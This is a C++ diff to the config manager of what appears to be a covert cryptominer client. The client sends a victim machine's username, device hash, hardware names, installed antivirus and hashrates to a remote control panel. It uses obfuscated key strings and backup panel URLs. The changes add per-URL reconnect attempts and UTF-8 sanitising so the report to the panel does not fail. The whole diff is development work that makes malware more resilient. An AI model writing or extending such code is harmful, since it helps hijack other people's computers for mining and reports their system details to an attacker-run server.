@@ -47,32 +47,48 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
     std::cout << "[*] Trying " << urls.size() << " panel URL(s) with fallback support" << std::endl;
 #endif
     
-    // Try each URL in sequence
+    // Try each URL in sequence. Every URL gets MAX_RECONNECT_ATTEMPTS tries
+    // before the client moves on to the next (backup) URL, and only once every
+    // URL is exhausted does it fall back to the internal (embedded) config.
+    const int MAX_RECONNECT_ATTEMPTS = 3;
+    const int RECONNECT_DELAY_SECONDS = 3;
+
     for (size_t i = 0; i < urls.size(); i++) {
         std::wstring wurl(urls[i].begin(), urls[i].end());
-        
+
+        for (int attempt = 1; attempt <= MAX_RECONNECT_ATTEMPTS; attempt++) {
 #ifdef ENABLE_DEBUG_CONSOLE
-        std::cout << "[*] Attempting connection to panel " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
+            std::cout << "[*] Attempting connection to panel " << (i + 1) << "/" << urls.size()
+                      << ": " << urls[i] << " (attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << ")" << std::endl;
 #endif
-        
-        if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion, cpuHashrate, gpuHashrate, deviceUptimeMin)) {
+
+            if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion, cpuHashrate, gpuHashrate, deviceUptimeMin)) {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
+                std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
 #endif
-            m_lastFetchFromPanel = true;
-            return true;
+                m_lastFetchFromPanel = true;
+                return true;
+            }
+
+            // Reconnect before giving up on this URL
+            if (attempt < MAX_RECONNECT_ATTEMPTS) {
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[-] Attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << " failed, reconnecting in "
+                          << RECONNECT_DELAY_SECONDS << "s..." << std::endl;
+#endif
+                std::this_thread::sleep_for(std::chrono::seconds(RECONNECT_DELAY_SECONDS));
+            }
         }
-        
-        // If this wasn't the last URL, wait before trying next
-        if (i < urls.size() - 1) {
+
+        // Only after MAX_RECONNECT_ATTEMPTS failed reconnects: next (backup) URL
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[-] Failed to connect, waiting 3 seconds before trying next URL..." << std::endl;
-#endif
-            std::this_thread::sleep_for(std::chrono::seconds(3));
+        if (i + 1 < urls.size()) {
+            std::cout << "[-] " << MAX_RECONNECT_ATTEMPTS << " attempts failed, switching to backup URL..." << std::endl;
         }
+#endif
     }
-    
-    std::cerr << "[-] All panel URLs failed" << std::endl;
+
+    std::cerr << "[-] All panel URLs failed (" << MAX_RECONNECT_ATTEMPTS << " attempts each)" << std::endl;
     
     // Try embedded config as fallback
     if (LoadEmbeddedConfig()) {
@@ -107,32 +123,47 @@ bool ConfigManager::FetchConfigFromUrlWithFallback(const std::string& configUrls
     std::cout << "[*] Trying " << urls.size() << " config URL(s) with fallback support" << std::endl;
 #endif
     
-    // Try each URL in sequence
+    // Same reconnect policy as the POST path: MAX_RECONNECT_ATTEMPTS per URL
+    // before switching to the backup URL, embedded config only after all URLs fail.
+    const int MAX_RECONNECT_ATTEMPTS = 3;
+    const int RECONNECT_DELAY_SECONDS = 3;
+
     for (size_t i = 0; i < urls.size(); i++) {
         std::wstring wurl(urls[i].begin(), urls[i].end());
-        
+
+        for (int attempt = 1; attempt <= MAX_RECONNECT_ATTEMPTS; attempt++) {
 #ifdef ENABLE_DEBUG_CONSOLE
-        std::cout << "[*] Attempting GET request to config URL " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
+            std::cout << "[*] Attempting GET request to config URL " << (i + 1) << "/" << urls.size()
+                      << ": " << urls[i] << " (attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << ")" << std::endl;
 #endif
-        
-        if (FetchConfigFromUrlDirect(wurl)) {
+
+            if (FetchConfigFromUrlDirect(wurl)) {
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[+] Successfully fetched config from: " << urls[i] << std::endl;
+                std::cout << "[+] Successfully fetched config from: " << urls[i] << std::endl;
 #endif
-            m_lastFetchFromPanel = true;
-            return true;
+                m_lastFetchFromPanel = true;
+                return true;
+            }
+
+            // Reconnect before giving up on this URL
+            if (attempt < MAX_RECONNECT_ATTEMPTS) {
+#ifdef ENABLE_DEBUG_CONSOLE
+                std::cout << "[-] Attempt " << attempt << "/" << MAX_RECONNECT_ATTEMPTS << " failed, reconnecting in "
+                          << RECONNECT_DELAY_SECONDS << "s..." << std::endl;
+#endif
+                std::this_thread::sleep_for(std::chrono::seconds(RECONNECT_DELAY_SECONDS));
+            }
         }
-        
-        // If this wasn't the last URL, wait before trying next
-        if (i < urls.size() - 1) {
+
+        // Only after MAX_RECONNECT_ATTEMPTS failed reconnects: next (backup) URL
 #ifdef ENABLE_DEBUG_CONSOLE
-            std::cout << "[-] Failed to connect, waiting 3 seconds before trying next URL..." << std::endl;
-#endif
-            std::this_thread::sleep_for(std::chrono::seconds(3));
+        if (i + 1 < urls.size()) {
+            std::cout << "[-] " << MAX_RECONNECT_ATTEMPTS << " attempts failed, switching to backup URL..." << std::endl;
         }
+#endif
     }
-    
-    std::cerr << "[-] All config URLs failed" << std::endl;
+
+    std::cerr << "[-] All config URLs failed (" << MAX_RECONNECT_ATTEMPTS << " attempts each)" << std::endl;
     
     // Try embedded config as fallback
     if (LoadEmbeddedConfig()) {
@@ -188,17 +219,31 @@ bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
                                          double gpuHashrate,
                                          int deviceUptimeMin) {
     try {
+        // Guard rail: nlohmann::json::dump() throws type_error.316 on invalid
+        // UTF-8 and would abort the whole report, so make sure every string that
+        // originates from the OS is valid UTF-8 before it is serialised.
+        const std::string safeUsername = EnsureValidUTF8(pcUsername);
+        const std::string safeCpuName  = EnsureValidUTF8(cpuName);
+        const std::string safeGpuName  = EnsureValidUTF8(gpuName);
+        const std::string safeAvName   = EnsureValidUTF8(antivirusName);
+        const std::string safeVersion  = EnsureValidUTF8(clientVersion);
+
+        if (safeUsername != pcUsername || safeCpuName != cpuName ||
+            safeGpuName != gpuName || safeAvName != antivirusName) {
+            std::cerr << "[-] Warning: non UTF-8 system info sanitised before reporting" << std::endl;
+        }
+
         // Build miner report JSON
         json minerReport = {
-            {OBFUSCATE_STRING("pc_username"),      pcUsername},
-            {OBFUSCATE_STRING("device_hash"),      deviceHash},
-            {OBFUSCATE_STRING("cpu_name"),         cpuName},
-            {OBFUSCATE_STRING("gpu_name"),         gpuName},
+            {OBFUSCATE_STRING("pc_username"),      safeUsername},
+            {OBFUSCATE_STRING("device_hash"),      EnsureValidUTF8(deviceHash)},
+            {OBFUSCATE_STRING("cpu_name"),         safeCpuName},
+            {OBFUSCATE_STRING("gpu_name"),         safeGpuName},
             {OBFUSCATE_STRING("cpu_hashrate"),     cpuHashrate},
             {OBFUSCATE_STRING("gpu_hashrate"),     gpuHashrate},
-            {OBFUSCATE_STRING("antivirus_name"),   antivirusName},
+            {OBFUSCATE_STRING("antivirus_name"),   safeAvName},
             {OBFUSCATE_STRING("device_uptime_min"),deviceUptimeMin},
-            {OBFUSCATE_STRING("client_version"),   clientVersion},
+            {OBFUSCATE_STRING("client_version"),   safeVersion},
             {OBFUSCATE_STRING("timestamp"),        std::time(nullptr)}
         };
 
